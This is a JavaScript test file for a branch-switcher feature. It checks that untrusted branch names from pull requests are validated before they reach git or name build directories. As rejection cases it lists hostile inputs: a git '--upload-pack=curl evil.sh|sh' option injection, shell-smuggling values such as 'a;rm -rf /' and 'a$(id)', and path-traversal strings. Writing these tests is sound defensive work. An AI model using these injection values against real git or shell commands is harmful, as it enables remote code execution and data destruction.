// The branch switcher's boundary, which is the whole security surface of the
// feature.
//
// A branch name here is UNTRUSTED INPUT in the same sense as a recorded step or
// an imported spec: it comes from a pull request's head ref, which anyone who
// can open a PR chooses, and it is then handed to git as an argument and used
// to name a directory that gets built and executed. The two failures those two
// uses admit are completely different, so they are pinned separately below.
//
// Lives here rather than beside shared/branch-paths.mjs because vitest's node
// project takes `main/**`, `mcp/**` and `renderer/lib/**` — a test file under
// shared/ matches NEITHER project and would pass by never running.

import { describe, expect, it } from "vitest";

import {
  branchFromArgv,
  branchNameProblem,
  branchSlug,
  isInside,
  isValidBranchName,
  parseGitHubRemote,
  worktreeDirFor,
} from "../../shared/branch-paths.mjs";

describe("branch name validation", () => {
  it("accepts the shapes real branches use", () => {
    for (const name of [
      "main",
      "claude/in-app-branch-switcher-6be4f1",
      "feat/step-reordering",
      "release-1.2.3",
      "fix_thing",
      "v2.0",
    ]) {
      expect(branchNameProblem(name), name).toBeNull();
    }
  });

  it("refuses a name git would read as an option", () => {
    // The one that matters most, and the one shell-quoting cannot help with:
    // execFile spawns no shell, so nothing here can inject a COMMAND — but the
    // name is still argv, and `git fetch --upload-pack=<anything>` runs that
    // anything. A leading dash is the entire attack.
    expect(isValidBranchName("--upload-pack=curl evil.sh|sh")).toBe(false);
    expect(isValidBranchName("-x")).toBe(false);
    expect(branchNameProblem("--force")).toMatch(/option/);
    // …while a dash anywhere else is completely ordinary.
    expect(isValidBranchName("fix-the-thing")).toBe(true);
  });

  it("refuses the shapes that would escape a directory", () => {
    for (const name of ["../../etc", "..", "a/../../b", "/abs", "trailing/", "a//b"]) {
      expect(isValidBranchName(name), name).toBe(false);
    }
  });

  it("refuses shell and whitespace characters outright", () => {
    for (const name of ["a b", "a;rm -rf /", "a$(id)", "a`id`", "a|b", "a&b", "a\nb", "a\\b", "a'b"]) {
      expect(isValidBranchName(name), name).toBe(false);
    }
  });

  it("refuses names git itself rejects", () => {
    expect(isValidBranchName(".hidden")).toBe(false);
    expect(isValidBranchName("nested/.hidden")).toBe(false);
    expect(isValidBranchName("thing.lock")).toBe(false);
    expect(isValidBranchName("thing.")).toBe(false);
    expect(isValidBranchName("")).toBe(false);
    expect(isValidBranchName("x".repeat(201))).toBe(false);
  });
});

describe("branch build directories", () => {
  it("keeps every accepted name inside the builds root", () => {
    const root = "/data/branch-builds";
    for (const name of ["main", "a/b/c/d", "release-1.2.3", "x".repeat(120)]) {
      expect(isInside(root, worktreeDirFor(root, name)), name).toBe(true);
    }
  });

  it("throws rather than falling back when the name is refused", () => {
    // A fallback directory would mean an unacceptable ref quietly building
    // somewhere. There is no safe default here, so there is no default.
    expect(() => worktreeDirFor("/data/branch-builds", "../escape")).toThrow();
    expect(() => worktreeDirFor("/data/branch-builds", "--upload-pack=x")).toThrow();
  });

  it("gives names that slug identically different directories", () => {
    // Slugging alone cannot promise uniqueness, and a collision means one
    // branch's build silently runs as another's — which looks like the switch
    // working and is the worst possible failure for a review tool.
    expect(branchSlug("feat/login")).not.toBe(branchSlug("feat-login"));
    expect(worktreeDirFor("/root", "feat/login")).not.toBe(worktreeDirFor("/root", "feat-login"));
  });

  it("is stable for the same name, so a second switch reuses the checkout", () => {
    expect(branchSlug("feat/login")).toBe(branchSlug("feat/login"));
  });

  it("does not treat a sibling with a shared prefix as contained", () => {
    expect(isInside("/a/builds", "/a/builds-evil")).toBe(false);
    expect(isInside("/a/builds", "/a/builds")).toBe(true);
    expect(isInside("/a/builds", "/a/builds/x")).toBe(true);
  });
});

describe("parsing the origin remote", () => {
  it("reads the three forms git reports", () => {
    const expected = { owner: "csteubs", name: "good-looks" };
    expect(parseGitHubRemote("https://github.com/csteubs/good-looks.git")).toEqual(expected);
    expect(parseGitHubRemote("https://github.com/csteubs/good-looks")).toEqual(expected);
    expect(parseGitHubRemote("git@github.com:csteubs/good-looks.git")).toEqual(expected);
    expect(parseGitHubRemote("ssh://git@github.com/csteubs/good-looks.git")).toEqual(expected);
  });

  it("returns null for a remote that isn't GitHub", () => {
    // Null, not a guess: the view uses it to say "there are no pull requests to
    // list here", which an empty array would render as "no open PRs".
    expect(parseGitHubRemote("https://gitlab.com/o/r.git")).toBeNull();
    expect(parseGitHubRemote("https://github.example.com/o/r")).toBeNull();
    expect(parseGitHubRemote("")).toBeNull();
  });
});

describe("reading the relaunch flag", () => {
  it("finds the branch a relaunch carried", () => {
    expect(branchFromArgv(["/app", "--gl-no-dev-url", "--gl-branch=feat/x"])).toBe("feat/x");
  });

  it("is null when running the user's own checkout", () => {
    expect(branchFromArgv(["/app", "--gl-no-dev-url"])).toBeNull();
  });

  it("refuses a value that would not have been accepted on the way out", () => {
    // A command line is not trusted just because we usually write it. This
    // value decides what the UI claims is running.
    expect(branchFromArgv(["--gl-branch=../../etc"])).toBeNull();
    expect(branchFromArgv(["--gl-branch=--upload-pack=x"])).toBeNull();
  });
});
